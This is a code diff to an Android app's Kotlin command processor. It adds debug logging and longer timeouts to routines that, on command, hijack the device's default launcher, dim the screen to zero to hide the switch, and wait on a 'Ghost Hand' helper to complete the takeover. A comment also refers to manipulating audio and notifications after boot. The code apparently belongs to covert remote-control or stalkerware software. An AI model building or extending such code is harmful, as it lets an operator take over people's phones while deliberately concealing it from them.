@@ -2318,6 +2318,7 @@ object CommandProcessor {
                     // 3. Check and Hijack Default Launcher
                     val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
                     if (currentHome != ctx.packageName) {
+                        DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 3: Not Default Home ($currentHome). Initiating embedded hijack.")
                         LauncherManager.isHijacking = true
                         LauncherManager.pendingCmdId = id
                         
@@ -2326,21 +2327,25 @@ object CommandProcessor {
                                 val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
                                     addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
                                 }
+                                DebugLogger.log("FINALIZE_LIFECYCLE", "Firing Intent: ${intent.action}")
                                 ctx.startActivity(intent)
                             } catch (e: Exception) {
+                                DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Embedded hijack intent failed: ${e.message}")
                                 LauncherManager.isHijacking = false
                             }
                         }
                         
-                        // Wait for Ghost Hand to finish hijack (Max 10s)
+                        // Wait for Ghost Hand to finish hijack (Increased to 25s for heavy boot lag)
                         var waitTime = 0
-                        while (LauncherManager.isHijacking && waitTime < 10000) {
+                        while (LauncherManager.isHijacking && waitTime < 25000) {
                             kotlinx.coroutines.delay(500)
                             waitTime += 500
+                            if (waitTime % 5000 == 0) DebugLogger.log("FINALIZE_LIFECYCLE", "Hijack waiting... (${waitTime}ms elapsed)")
                         }
-                        DebugLogger.log("FINALIZE", "Launcher hijack completed or timed out. WaitTime: ${waitTime}ms")
+                        DebugLogger.log("FINALIZE_LIFECYCLE", "Launcher hijack loop exited. Final WaitTime: ${waitTime}ms. isHijacking: ${LauncherManager.isHijacking}")
+                        LauncherManager.isHijacking = false // Guarantee safety clear
                     } else {
-                        DebugLogger.log("FINALIZE", "Already default launcher. Skipping hijack.")
+                        DebugLogger.log("FINALIZE_LIFECYCLE", "Already default launcher. Skipping Phase 3.")
                     }
 
                     // 4. Post-Boot Audio and Notification Manipulation
@@ -2471,17 +2476,21 @@ object CommandProcessor {
                     errorMsg = "Sequence finished. Heavy Boot is Active."
                 }
                 "HIJACK_LAUNCHER" -> {
+                    DebugLogger.log("HIJACK_INIT", "Command [HIJACK_LAUNCHER] received. ID: $id")
                     LauncherManager.isHijacking = true
                     LauncherManager.pendingCmdId = id
                     
                     android.os.Handler(android.os.Looper.getMainLooper()).post {
+                        DebugLogger.log("HIJACK_INIT", "Applying Dimmer (0, AUTO) to mask transition.")
                         DimmerManager.applyDim(ctx, 0, "AUTO")
                         try {
                             val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
                                 addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
                             }
+                            DebugLogger.log("HIJACK_INIT", "Firing Intent: ${intent.action}")
                             ctx.startActivity(intent)
                         } catch (e: Exception) {
+                            DebugLogger.log("HIJACK_INIT_ERR", "Intent failed to launch: ${e.message}")
                             LauncherManager.isHijacking = false
                             DimmerManager.removeOverlay(ctx)
                         }
@@ -2490,6 +2499,7 @@ object CommandProcessor {
                     // Safety fuse: Reset if stuck for 30s
                     android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                         if (LauncherManager.isHijacking) {
+                            DebugLogger.log("HIJACK_TIMEOUT", "30s timeout reached. Aborting hijack sequence.")
                             LauncherManager.isHijacking = false
                             DimmerManager.removeOverlay(ctx)
                         }
